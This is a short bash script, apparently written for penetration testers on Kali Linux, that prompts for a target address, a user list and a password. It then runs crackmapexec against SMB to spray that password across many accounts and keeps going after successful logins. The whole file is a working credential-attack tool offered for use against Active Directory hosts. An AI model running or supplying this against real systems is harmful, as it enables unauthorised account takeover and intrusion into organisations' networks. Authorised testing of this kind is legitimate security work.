#!/bin/bash 

# This is a script which asks for parameters to do password spraying with crackmapexec so you don't need to remember the syntax!
# Save this to /usr/local/bin on your Kali Linux machine and then you can just type ad_passwordspray.sh to launch it


read -p "Enter the target address: " ip_address

read -p "Enter the path to userlist: " users_file

read -p "Enter the password of the user: " password

crackmapexec smb $ip_address -u $users_file -p $password --continue-on-success
echo -e "\n📅 Test Date: $(date)"
